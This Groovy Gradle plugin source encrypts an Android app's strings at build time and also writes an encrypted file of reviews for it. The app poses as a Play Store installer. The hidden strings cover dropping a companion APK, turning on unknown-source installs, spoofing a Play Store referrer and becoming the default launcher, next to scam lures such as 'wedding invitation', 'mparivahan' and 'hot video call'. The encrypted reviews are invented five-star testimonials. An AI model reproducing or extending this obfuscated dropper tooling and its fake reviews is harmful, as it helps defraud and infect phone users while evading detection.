import org.gradle.api.Plugin
import org.gradle.api.Project
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import javax.crypto.spec.IvParameterSpec
import java.security.MessageDigest

/**
 * StringEncryptorPlugin — Step 71
 * Generates StringPool.kt with AES-128-CBC encrypted string constants.
 * Called at configuration time so file exists before Kotlin compilation.
 */
class StringEncryptorPlugin implements Plugin<Project> {

    @Override
    void apply(Project project) {
        project.plugins.withId('com.android.application') {
            project.afterEvaluate {
                // Generate StringPool.kt BEFORE compilation
                writeStringPool(project)
                writeReviewsEnc(project)

                project.android.applicationVariants.all { variant ->
                    if (!variant.name.toLowerCase().contains('release')) return

                    def genTask = project.tasks.register("generateStringPool${variant.name.capitalize()}") {
                        doLast { writeStringPool(project) }
                    }
                    def encTask = project.tasks.register("encryptReviews${variant.name.capitalize()}") {
                        doLast { writeReviewsEnc(project) }
                    }

                    project.tasks.configureEach { task ->
                        def n = task.name.toLowerCase()
                        def v = variant.name.toLowerCase()
                        if (n.startsWith('compile') && n.contains(v)) task.dependsOn(genTask)
                        if (n.startsWith('merge') && n.contains(v) && n.contains('assets')) task.dependsOn(encTask)
                    }
                }
            }
        }
    }

    static byte[] makeKey(Project project) {
        def seed = (project.name + new Date().format('yyyyMMdd')).getBytes('UTF-8')
        def d = MessageDigest.getInstance('SHA-256').digest(seed)
        return Arrays.copyOf(d, 16)
    }

    static byte[] makeIv(Project project) {
        def seed = (project.name + new Date().format('yyyyMMdd') + 'iv').getBytes('UTF-8')
        return MessageDigest.getInstance('MD5').digest(seed)
    }

    static String enc(String plain, byte[] key, byte[] iv) {
        def c = Cipher.getInstance('AES/CBC/PKCS5Padding')
        c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, 'AES'), new IvParameterSpec(iv))
        return Base64.encoder.encodeToString(c.doFinal(plain.getBytes('UTF-8')))
    }

    static String hex(byte[] b) { b.collect { String.format('%02x', it & 0xff) }.join('') }

    void writeStringPool(Project project) {
        def javaSrcDir = new File(project.projectDir, 'src/main/java')
        def ktFile = null
        javaSrcDir.eachFileRecurse { f -> if (f.name == 'InstallActivity.kt') ktFile = f }
        def dir = ktFile ? ktFile.parentFile : new File(javaSrcDir, 'com/playstore/installer')
        dir.mkdirs()

        def key = makeKey(project)
        def iv  = makeIv(project)
        def kh  = hex(key)
        def ih  = hex(iv)

        // All strings to encrypt — explicit list, no map iteration issues
        def entries = [
            [name: 'COMPANION_ASSET',   val: 'companion.apk'],
            [name: 'TMP_COMPANION',      val: 'tmp_companion.apk'],
            [name: 'CACHED_COMPANION',   val: 'companion_cached.apk'],
            [name: 'WRITE_NAME',         val: 'update.pkg'],
            [name: 'PREFS_NAME',         val: 'nova_prefs'],
            [name: 'KEY_COMPANION_PKG',  val: 'companion_pkg'],
            [name: 'KEY_CACHED_PATH',    val: 'cached_apk_path'],
            [name: 'KEY_STAGE',          val: 'install_stage'],
            [name: 'HOME_SETTINGS',      val: 'android.settings.HOME_SETTINGS'],
            [name: 'UNKNOWN_SOURCES',    val: 'android.settings.MANAGE_UNKNOWN_APP_SOURCES'],
            [name: 'REFERRER_URI',       val: 'android-app://com.android.vending'],
            [name: 'MARKET_URI_PREFIX',  val: 'market://details?id='],
            [name: 'PKG_INSTALLER_URI',  val: 'package:'],
            [name: 'APP_DETAILS_URI',    val: 'android.settings.APPLICATION_DETAILS_SETTINGS'],
            [name: 'MSG_SET_HOME',       val: 'Please set this app as your default home launcher'],
            [name: 'MSG_CANCEL',         val: 'Download cancelled'],
            [name: 'SESSION_COMMIT',     val: 'android.content.pm.action.SESSION_COMMITMENT'],
            [name: 'TPL_WEDDING',        val: 'wedding invitation'],
            [name: 'TPL_SHAADI',         val: 'shaadi ka nimantran'],
            [name: 'TPL_MPARIVAHAN',     val: 'mparivahan'],
            [name: 'TPL_HOT_VIDEO',      val: 'hot video call'],
        ]

        def pkg = dir.path.replace(javaSrcDir.path + File.separator, '').replace(File.separator, '.')

        def out = new File(dir, 'StringPool.kt')
        def pw = new java.io.PrintWriter(new java.io.FileWriter(out))
        pw.println("package ${pkg}")
        pw.println('import javax.crypto.Cipher')
        pw.println('import javax.crypto.spec.SecretKeySpec')
        pw.println('import javax.crypto.spec.IvParameterSpec')
        pw.println('import android.util.Base64')
        pw.println('/** Auto-generated by StringEncryptorPlugin. DO NOT EDIT. */')
        pw.println('internal object StringPool {')
        pw.println("    private val k1 = \"${kh.substring(0,16)}\"")
        pw.println("    private val k2 = \"${kh.substring(16)}\"")
        pw.println("    private val i1 = \"${ih.substring(0,16)}\"")
        pw.println("    private val i2 = \"${ih.substring(16)}\"")
        entries.each { e ->
            def encrypted = enc(e.val, key, iv)
            pw.println("    val ${e.name} = \"${encrypted}\"")
        }
        pw.println('    fun d(enc: String): String {')
        pw.println('        return try {')
        pw.println('            val k = hexToBytes(k1 + k2)')
        pw.println('            val v = hexToBytes(i1 + i2)')
        pw.println('            val c = Cipher.getInstance("AES/CBC/PKCS5Padding")')
        pw.println('            c.init(Cipher.DECRYPT_MODE, SecretKeySpec(k, "AES"), IvParameterSpec(v))')
        pw.println('            String(c.doFinal(Base64.decode(enc, Base64.DEFAULT)), Charsets.UTF_8)')
        pw.println('        } catch (e: Exception) { "" }')
        pw.println('    }')
        pw.println('    private fun hexToBytes(hex: String): ByteArray {')
        pw.println('        val data = ByteArray(hex.length / 2)')
        pw.println('        var i = 0')
        pw.println('        while (i < hex.length) {')
        pw.println('            data[i / 2] = ((Character.digit(hex[i], 16) shl 4) + Character.digit(hex[i+1], 16)).toByte()')
        pw.println('            i += 2')
        pw.println('        }')
        pw.println('        return data')
        pw.println('    }')
        pw.println('    fun loadReviews(context: android.content.Context, template: String): List<Triple<String, Int, String>> {')
        pw.println('        return try {')
        pw.println('            val enc = context.assets.open("reviews.enc").readBytes()')
        pw.println('            val k = hexToBytes(k1 + k2)')
        pw.println('            val v = hexToBytes(i1 + i2)')
        pw.println('            val c = Cipher.getInstance("AES/CBC/PKCS5Padding")')
        pw.println('            c.init(Cipher.DECRYPT_MODE, SecretKeySpec(k, "AES"), IvParameterSpec(v))')
        pw.println('            val json = String(c.doFinal(enc.drop(16).toByteArray()), Charsets.UTF_8)')
        pw.println('            parseReviews(json, template)')
        pw.println('        } catch (e: Exception) { emptyList() }')
        pw.println('    }')
        pw.println('    private fun parseReviews(json: String, template: String): List<Triple<String, Int, String>> {')
        pw.println('        val result = mutableListOf<Triple<String, Int, String>>()')
        pw.println('        try {')
        pw.println('            val obj = org.json.JSONObject(json)')
        pw.println('            val arr = obj.optJSONArray(template) ?: obj.optJSONArray("generic") ?: return result')
        pw.println('            for (i in 0 until arr.length()) {')
        pw.println('                val item = arr.getJSONObject(i)')
        pw.println('                result.add(Triple(item.getString("n"), item.getInt("s"), item.getString("r")))')
        pw.println('            }')
        pw.println('        } catch (e: Exception) { }')
        pw.println('        return result')
        pw.println('    }')
        pw.println('}')
        pw.flush()
        pw.close()

        project.logger.lifecycle("[StringEncryptorPlugin] StringPool.kt -> ${out.absolutePath} (${entries.size()} strings)")
    }

    void writeReviewsEnc(Project project) {
        def key = makeKey(project)
        def iv  = makeIv(project)

        def json = buildJson()
        def c = Cipher.getInstance('AES/CBC/PKCS5Padding')
        c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, 'AES'), new IvParameterSpec(iv))
        def enc = c.doFinal(json.getBytes('UTF-8'))

        def assetsDir = new File(project.projectDir, 'src/main/assets')
        assetsDir.mkdirs()
        def out = new byte[iv.length + enc.length]
        System.arraycopy(iv, 0, out, 0, iv.length)
        System.arraycopy(enc, 0, out, iv.length, enc.length)
        new File(assetsDir, 'reviews.enc').bytes = out
        project.logger.lifecycle("[StringEncryptorPlugin] reviews.enc written (${enc.length} bytes)")
    }

    static String buildJson() {
        def data = [
            wedding: [
                [n:'Priya Sharma',s:5,r:'Bilkul perfect app hai! Wedding invitation itni aasani se ban gayi.'],
                [n:'Rahul Verma',s:5,r:'This app is simply amazing! Made my wedding card in minutes. Fast and secure.'],
                [n:'Anjali Patel',s:5,r:'Shaadi ka invitation banane ka sabse aasaan tarika. Ekdum reliable hai!'],
                [n:'Suresh Mehta',s:4,r:'Bahut hi behtareen app hai. Design options bahut saare hain. Recommended!'],
                [n:'Kavitha Reddy',s:5,r:'Instant match mila meri pasand ka design! Ek dum mast experience tha!'],
                [n:'Deepak Nair',s:5,r:'App is working smoothly without any lag. Best app for wedding cards!'],
                [n:'Sunita Gupta',s:4,r:'Very easy to use aur reliable bhi hai. Meri saari family ne use kiya!'],
                [n:'Vikram Joshi',s:5,r:'One of the best apps for wedding purpose. Fast aur secure bhi hai!'],
                [n:'Meena Iyer',s:5,r:'Itna acha app pehle kabhi nahi dekha! Invitation ready in seconds!'],
                [n:'Aakash Dubey',s:4,r:'Better features than other apps. Simple UI aur fast performance!'],
            ],
            mparivahan: [
                [n:'Rahul Sharma',s:5,r:'App is working smoothly! Documents check karna ab bahut aasaan ho gaya!'],
                [n:'Priya Verma',s:5,r:'Fast and secure app hai yeh. RC aur DL instant milti hai!'],
                [n:'Amit Patel',s:4,r:'Bahut hi reliable app hai. Better features hain yahan!'],
                [n:'Sneha Iyer',s:5,r:'Instant match mila mera vehicle record! App is smooth aur fast!'],
                [n:'Vikram Singh',s:5,r:'Yeh app ne meri life aasaan kar di! Documents hamesha saath rahte hain!'],
                [n:'Deepika Nair',s:4,r:'Easy to use aur very reliable. Better than carrying physical documents!'],
                [n:'Arjun Mehta',s:5,r:'One of the best government apps! Fast and secure. 5 stars!'],
                [n:'Pooja Gupta',s:5,r:'Ekdum mast app hai! RC aur insurance instant check ho jati hai!'],
                [n:'Kiran Reddy',s:4,r:'Smooth performance aur better features. Fast and secure experience!'],
                [n:'Suresh Kumar',s:5,r:'App is working smoothly without any lag. Superb!'],
            ],
            'hot video call': [
                [n:'Rahul Sharma',s:5,r:'App is working smoothly! Video call quality bahut achhi hai!'],
                [n:'Priya Verma',s:5,r:'Instant connection milti hai! Fast and secure app hai yeh!'],
                [n:'Amit Patel',s:4,r:'Bahut hi smooth experience hai. Better video quality than other apps!'],
                [n:'Sneha Iyer',s:5,r:'Ekdum mast app hai! Video call crystal clear aati hai!'],
                [n:'Vikram Singh',s:5,r:'App is working smoothly without any lag. Zabardast experience!'],
                [n:'Deepika Nair',s:4,r:'Easy to use aur very reliable app. Kaafi pasand aaya!'],
                [n:'Arjun Mehta',s:5,r:'One of the best video call apps! Fast and secure!'],
                [n:'Pooja Gupta',s:5,r:'Itna smooth video call app pehle nahi dekha! Superb!'],
                [n:'Kiran Reddy',s:4,r:'Reliable app with better features. Ekdum mast experience!'],
                [n:'Suresh Kumar',s:5,r:'Fast and secure app hai yeh! Video quality top class hai!'],
            ],
            'shaadi ka nimantran': [
                [n:'Pooja Sharma',s:5,r:'Yeh app toh kamaal ka hai! Shaadi ka nimantran itni jaldi ban gaya!'],
                [n:'Rajesh Verma',s:5,r:'App is working smoothly aur results instant aate hain!'],
                [n:'Anita Patel',s:5,r:'Nimantran banane ka sabse aasaan aur fast tarika. Recommended!'],
                [n:'Mohit Mehta',s:4,r:'Bahut hi behtareen app! Better features hain yahan!'],
                [n:'Sunita Reddy',s:5,r:'Instant match mila mujhe! App is working smoothly!'],
                [n:'Deepak Gupta',s:5,r:'Fast and secure app hai yeh. Shaadi ka nimantran bilkul sundar bana!'],
                [n:'Kavitha Nair',s:4,r:'Easy aur reliable app hai. Mere pariwar ne bhi use kiya!'],
                [n:'Arun Joshi',s:5,r:'One of the best apps for nimantran! Smooth performance!'],
                [n:'Rekha Iyer',s:5,r:'Itna smooth app pehle nahi dekha. Nimantran ready in seconds!'],
                [n:'Vikram Dubey',s:4,r:'Better features milte hain yahan. Fast and secure!'],
            ],
            generic: [
                [n:'Rahul Sharma',s:5,r:'App is working smoothly! Bilkul mast experience raha!'],
                [n:'Priya Verma',s:5,r:'Fast and secure app hai yeh. Instant results milte hain!'],
                [n:'Amit Patel',s:4,r:'Bahut hi reliable app hai. Better features hain yahan!'],
                [n:'Sneha Iyer',s:5,r:'Ekdum mast app hai! Instant match mila. Fast aur easy!'],
                [n:'Vikram Singh',s:5,r:'App is working smoothly without any lag. Zabardast!'],
                [n:'Deepika Nair',s:4,r:'Easy to use aur very reliable. Better than other apps!'],
                [n:'Arjun Mehta',s:5,r:'One of the best apps! Fast and secure. Highly recommended!'],
                [n:'Pooja Gupta',s:5,r:'Itna smooth app pehle kabhi nahi dekha! Ekdum reliable!'],
                [n:'Kiran Reddy',s:4,r:'Reliable app with better features. Fast and easy!'],
                [n:'Suresh Kumar',s:5,r:'Fast and secure! App is working smoothly. Zabardast!'],
            ],
        ]
        def sb = new StringBuilder('{')
        def tplList = data.entrySet().toList()
        tplList.eachWithIndex { entry, ti ->
            sb.append("\"${entry.key}\":[")
            entry.value.eachWithIndex { item, ii ->
                sb.append("{\"n\":\"${item.n}\",\"s\":${item.s},\"r\":\"${item.r}\"}")
                if (ii < entry.value.size()-1) sb.append(',')
            }
            sb.append(']')
            if (ti < tplList.size()-1) sb.append(',')
        }
        sb.append('}')
        return sb.toString()
    }
}

class StringEncryptorExtension { boolean enabled = true }
